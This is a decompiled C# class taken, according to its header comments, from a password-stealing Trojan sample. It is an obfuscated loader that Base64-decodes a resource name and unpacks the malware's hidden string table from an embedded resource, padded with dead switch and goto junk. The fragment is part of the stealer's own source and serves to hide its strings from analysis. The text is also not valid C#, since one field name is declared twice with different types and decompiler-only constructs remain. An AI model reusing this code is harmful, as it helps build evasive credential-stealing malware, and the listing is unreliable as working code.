// Decompiled with JetBrains decompiler
// Type: Ajowans.StreamProvider
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using System;
using System.Reflection;
using System.Text;

namespace Ajowans
{
  internal class StreamProvider
  {
    internal static readonly byte[] pathList;
    internal readonly int pathList;

    static StreamProvider()
    {
      if (StreamProvider.pathList != null)
        return;
label_1:
      switch (6)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (StreamProvider.\u002Ecctor);
          }
          byte[] bytes = Convert.FromBase64String("QWpvd2FucyQ=");
          string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          StreamProvider.pathList = VectorProvider.RegisterFile(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
          break;
      }
    }

    internal static string RegisterFile(int pathList)
    {
      int count;
      if (((int) StreamProvider.pathList[pathList] & 128) == 0)
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (StreamProvider.RegisterFile);
            }
            count = (int) StreamProvider.pathList[pathList];
            ++pathList;
            break;
        }
      }
      else if (((int) StreamProvider.pathList[pathList] & 64) == 0)
      {
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            count = ((int) StreamProvider.pathList[pathList] & -129) << 8 | (int) StreamProvider.pathList[pathList + 1];
            pathList += 2;
            break;
        }
      }
      else
      {
        count = ((int) StreamProvider.pathList[pathList] & -193) << 24 | (int) StreamProvider.pathList[pathList + 1] << 16 | (int) StreamProvider.pathList[pathList + 2] << 8 | (int) StreamProvider.pathList[pathList + 3];
        pathList += 4;
      }
      if (count >= 1)
        return string.Intern(Encoding.Unicode.GetString(StreamProvider.pathList, pathList, count));
label_10:
      switch (2)
      {
        case 0:
          goto label_10;
        default:
          return string.Empty;
      }
    }
  }
}
